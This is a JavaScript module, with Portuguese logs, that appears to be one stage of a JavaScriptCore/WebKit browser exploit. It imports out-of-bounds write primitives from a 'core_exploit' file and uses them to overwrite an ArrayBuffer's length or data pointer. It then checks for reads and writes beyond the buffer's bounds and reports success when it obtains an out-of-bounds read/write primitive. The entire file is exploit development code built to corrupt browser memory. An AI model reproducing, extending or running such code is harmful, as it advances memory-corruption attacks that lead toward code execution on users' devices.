// js/script3/testCorruptMetadata.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex } from '../utils.mjs';
import {
    triggerOOB_primitive, oob_array_buffer_real, oob_dataview_real,
    oob_write_absolute, clearOOBEnvironment
} from '../core_exploit.mjs';
import { OOB_CONFIG, JSC_OFFSETS } from '../config.mjs';

export async function executeCorruptArrayBufferMetadataTest(
    testDescription,
    offsetToCorrupt, 
    valueToWrite,    
    bytesToWrite,
    isPointerCorruptionTest = false // Novo parâmetro para indicar se estamos testando corrupção de ponteiro
) {
    const FNAME_TEST = `executeCorruptMetadata<${testDescription}>`;

    logS3(`--- Iniciando Teste de Corrupção de Metadados AB: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Alvo Offset (rel. início oob_array_buffer_real): ${toHex(offsetToCorrupt)}, Valor: ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)}, Bytes: ${bytesToWrite}`, "info", FNAME_TEST);
    document.title = `Iniciando CorruptMetadata: ${testDescription}`;

    await triggerOOB_primitive(); 
    if (!oob_array_buffer_real) {
        logS3("Falha ao configurar ambiente OOB. Abortando.", "error", FNAME_TEST);
        document.title = "ERRO: Falha OOB Setup";
        return { corruptionSucceeded: false, details: "OOB Setup Failed" };
    }
    document.title = "OOB Configurado";

    const initialOOBArrayBufferByteLength = oob_array_buffer_real.byteLength;
    logS3(`Tamanho inicial de oob_array_buffer_real: ${initialOOBArrayBufferByteLength} bytes (${toHex(initialOOBArrayBufferByteLength)})`, "info", FNAME_TEST);

    let stepReached = "antes_escrita_oob";
    let corruptionAttempted = false;
    let testOutcome = {
        newByteLength: "N/A",
        readBeyondOriginal: "Não tentado",
        writeBeyondOriginal: "Não tentado",
        pointerReadAttempt: "Não aplicável"
    };
    let potentiallyCrashed = true; // Assumir que pode crashar até que o teste se prove estável

    try {
        if (offsetToCorrupt >= 0 && offsetToCorrupt + bytesToWrite <= initialOOBArrayBufferByteLength) {
            logS3(`CORRUPÇÃO: Escrevendo valor ${typeof valueToWrite === 'object' ? valueToWrite.toString(true) : toHex(valueToWrite)} (${bytesToWrite} bytes) em offset abs ${toHex(offsetToCorrupt)} do oob_array_buffer_real`, "warn", FNAME_TEST);
            stepReached = "antes_escrita_oob";
            document.title = `Antes Escrita OOB Metadata: ${testDescription}`;
            
            oob_write_absolute(offsetToCorrupt, valueToWrite, bytesToWrite);
            corruptionAttempted = true;
            logS3("Escrita OOB de metadados realizada.", "info", FNAME_TEST);
            stepReached = "apos_escrita_oob";
            document.title = `Após Escrita OOB Metadata: ${testDescription}`;
        } else {
            logS3(`AVISO: Offset de corrupção de metadados ${toHex(offsetToCorrupt)} inválido para o tamanho ${initialOOBArrayBufferByteLength}. Escrita não realizada.`, "warn", FNAME_TEST);
            stepReached = "escrita_oob_pulada_offset_invalido";
            document.title = `Escrita OOB Pulada (Offset Inválido): ${testDescription}`;
            potentiallyCrashed = false; // Não houve escrita, não deve crashar por isso
        }

        await PAUSE_S3(SHORT_PAUSE_S3);

        if (corruptionAttempted) {
            testOutcome.newByteLength = oob_array_buffer_real.byteLength;
            logS3(`Tamanho de oob_array_buffer_real APÓS corrupção: ${testOutcome.newByteLength} bytes (${toHex(testOutcome.newByteLength)})`, "leak", FNAME_TEST);
            if (testOutcome.newByteLength !== initialOOBArrayBufferByteLength) {
                logS3("!!! SUCESSO ESPECULATIVO: oob_array_buffer_real.byteLength FOI ALTERADO !!!", "vuln", FNAME_TEST);
                document.title = `SUCESSO: Tamanho AB Alterado! - ${testDescription}`;
            } else {
                logS3("Tamanho de oob_array_buffer_real NÃO foi alterado pela escrita.", "info", FNAME_TEST);
            }

            // Lógica de verificação pós-corrupção
            try {
                logS3("Criando nova DataView sobre o oob_array_buffer_real (potencialmente) corrompido...", "info", FNAME_TEST);
                const corruptedView = new DataView(oob_array_buffer_real);
                logS3(`Nova DataView criada. Comprimento da view (baseado no tamanho ATUAL do buffer): ${corruptedView.byteLength}`, "info", FNAME_TEST);

                if (isPointerCorruptionTest) {
                    logS3("Teste de Corrupção de Ponteiro: Tentando ler da DataView após corrupção do ponteiro...", "warn", FNAME_TEST);
                    document.title = `Tentando Leitura Pós-PtrCorrupt: ${testDescription}`;
                    stepReached = "antes_leitura_ptr_corrompido";
                    try {
                        let val = corruptedView.getUint32(0, true); // Tenta ler do início da DataView
                        testOutcome.pointerReadAttempt = `Sucesso: Lido ${toHex(val)} de offset 0`;
                        logS3(`   LEITURA PÓS-CORRUPÇÃO DE PONTEIRO BEM-SUCEDIDA (INESPERADO?): Valor lido = ${toHex(val)}`, "leak", FNAME_TEST);
                        document.title = `LEITURA PÓS-PTR OK (INESPERADO): ${testDescription}`;
                        potentiallyCrashed = false;
                    } catch (e_ptr_read) {
                        testOutcome.pointerReadAttempt = `ERRO: ${e_ptr_read.message}`;
                        logS3(`   ERRO ESPERADO/CAPTurado ao tentar ler após corrupção de ponteiro: ${e_ptr_read.name} - ${e_ptr_read.message}`, "critical", FNAME_TEST);
                        document.title = `ERRO Leitura Pós-PtrCorrupt: ${testDescription}`;
                        // Este é um "sucesso" se esperávamos um crash/erro aqui.
                        potentiallyCrashed = false; // Erro JS, não um crash de navegador não capturado.
                    }
                    stepReached = "apos_leitura_ptr_corrompido";

                } else { // Teste de corrupção de tamanho
                    const testOffsetBeyondOriginal = initialOOBArrayBufferByteLength + 4;
                    const testValue = 0xABABABAB;
                    if (testOutcome.newByteLength > initialOOBArrayBufferByteLength && testOffsetBeyondOriginal + 4 <= testOutcome.newByteLength) {
                        // ... (lógica de R/W além dos limites como antes) ...
                         logS3(`Tentando escrever ${toHex(testValue)} em offset ${toHex(testOffsetBeyondOriginal)} (além do original) usando nova DataView...`, "warn", FNAME_TEST);
                        corruptedView.setUint32(testOffsetBeyondOriginal, testValue, true);
                        testOutcome.writeBeyondOriginal = `Escrito ${toHex(testValue)} em ${toHex(testOffsetBeyondOriginal)}`;
                        
                        let readBack = corruptedView.getUint32(testOffsetBeyondOriginal, true);
                        testOutcome.readBeyondOriginal = `Lido ${toHex(readBack)} de ${toHex(testOffsetBeyondOriginal)}`;
                        if (readBack === testValue) {
                            logS3(`!!! SUCESSO DE LEITURA/ESCRITA ALÉM DOS LIMITES !!! Leu ${toHex(readBack)}`, "critical", FNAME_TEST);
                            document.title = `R/W OOB OBTIDO! - ${testDescription}`;
                        } else {
                            logS3(`Falha na verificação de R/W além dos limites. Lido: ${toHex(readBack)}, Esperado: ${toHex(testValue)}`, "error", FNAME_TEST);
                        }
                    } else {
                        logS3("Novo tamanho do buffer não é grande o suficiente para teste R/W além dos limites, ou não mudou.", "info", FNAME_TEST);
                        testOutcome.readBeyondOriginal = "Não aplicável (tamanho insuficiente)";
                        testOutcome.writeBeyondOriginal = "Não aplicável (tamanho insuficiente)";
                    }
                    potentiallyCrashed = false; // Completou a lógica de tamanho
                }
            } catch (e_view) { // Erro ao criar DataView ou na lógica de R/W
                logS3(`ERRO ao usar nova DataView ou R/W: ${e_view.message}`, "error", FNAME_TEST);
                document.title = `ERRO Nova DataView: ${testDescription}`;
                testOutcome.pointerReadAttempt = testOutcome.pointerReadAttempt === "Não aplicável" ? `Erro DataView: ${e_view.message}` : testOutcome.pointerReadAttempt;
                testOutcome.readBeyondOriginal = testOutcome.readBeyondOriginal === "Não tentado" ? `Erro DataView: ${e_view.message}` : testOutcome.readBeyondOriginal;
                potentiallyCrashed = false; // Erro JS, não crash não capturado
            }
        } else {
            potentiallyCrashed = false; // Não houve escrita, não deve crashar por isso
        }
    } catch (mainError) {
        stepReached = "erro_principal";
        document.title = `ERRO Principal CorruptMetadata: ${testDescription}`;
        logS3(`Erro principal no teste de corrupção de metadados (${testDescription}): ${mainError.message}`, "error", FNAME_TEST);
        console.error(mainError);
        potentiallyCrashed = false; // Erro JS, não crash não capturado
    } finally {
        clearOOBEnvironment();
        logS3(`Ambiente OOB Limpo. Último passo alcançado: ${stepReached}`, "info", FNAME_TEST);
        if (potentiallyCrashed && corruptionAttempted) {
            logS3(`O TESTE PODE TER CONGELADO/CRASHADO ANTES DA VERIFICAÇÃO PÓS-CORRUPÇÃO. Último passo: ${stepReached}`, "error", FNAME_TEST);
            document.title = `CRASH/CONGELOU? Passo: ${stepReached} - ${testDescription}`;
        }
    }
    logS3(`--- Teste de Corrupção de Metadados AB Concluído: ${testDescription} ---`, "test", FNAME_TEST);
    logS3(`   Detalhes Pós-Corrupção: Novo Tamanho=${testOutcome.newByteLength}, Escrita OOB="${testOutcome.writeBeyondOriginal}", Leitura OOB="${testOutcome.readBeyondOriginal}", Leitura Pós-PtrCorrupt="${testOutcome.pointerReadAttempt}"`, "info", FNAME_TEST);
    
    if (document.title.startsWith("Iniciando") || document.title.startsWith("OOB Configurado") || document.title.startsWith("Antes Escrita OOB")) {
         if (!potentiallyCrashed) document.title = `Teste Metadata OK: ${testDescription}`;
    }
}
